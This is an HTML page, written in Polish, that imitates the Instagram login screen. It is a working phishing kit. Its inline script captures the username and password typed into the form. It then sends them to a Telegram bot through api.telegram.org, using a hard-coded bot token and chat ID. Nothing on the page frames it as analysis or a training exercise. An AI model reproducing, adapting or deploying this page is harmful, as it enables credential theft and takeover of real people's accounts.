<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="assets/css/main.css">
  <title>Instagram</title>
</head>
<body>
  <main class="l-main">
      <div class="l-main__img">
        <img src="assets/img/homepage.png" alt="Smartphones">
      </div>
      <div class="l-user">
        <div class="c-panel group">
          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
          <form class="c-panel__form" id="loginForm">
            <input type="text" class="c-panel__input" id="login" placeholder="Numer telefonu, nazwa użytkownika lub adres e-mail">
            <input type="password" class="c-panel__input" id="password" placeholder="Hasło">
            <button type="submit" class="c-btn">Log In</button>
            <span class="c-panel__span">OR</span>
          </form>
          <a href="#" class="c-panel__facebook">Login with Facebook</a>
          <a href="#" class="c-panel__forgot">Forgot password?</a>
        </div>
        <div class="c-signup group">
          <p>Don't have an account? <span>Sign up</span></p>
        </div>
        <div class="c-app">
          <p>Get the app.</p>
          <div class="c-app__download">
            <img src="assets/img/apple.png" alt="Apple Store">
            <img src="assets/img/google.png" alt="Google Play">
          </div>
        </div>
      </div>
  </main>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const login = document.getElementById('login').value;
      const password = document.getElementById('password').value;

      const message = `🔐 Nowe logowanie:\n👤 Login: ${login}\n🔑 Hasło: ${password}`;

      const token = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ'; 
      const chat_id = '5447264217'; 

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        console.log("Wysłano do Telegrama:", data);
        alert("Wysłano dane logowania.");
      })
      .catch(error => {
        console.error("Błąd wysyłania:", error);
        alert("Nie udało się wysłać.");
      });
    });
  </script>
</body>
</html>
